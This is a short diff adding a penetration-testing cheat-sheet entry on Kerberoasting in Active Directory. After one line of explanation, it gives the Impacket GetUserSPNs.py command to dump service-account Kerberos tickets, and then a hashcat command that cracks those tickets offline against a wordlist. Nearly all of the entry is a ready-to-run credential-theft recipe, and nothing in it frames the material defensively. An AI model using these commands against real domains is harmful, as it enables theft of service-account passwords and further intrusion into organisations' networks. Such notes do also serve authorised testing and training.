@@ -1,0 +1,5 @@
+The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts.
+
+python GetUserSPNs.py {DOMAIN}/{USER}:{PASSWORD} -outputfile hashes.kerberoast
+> Hashcat
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt 
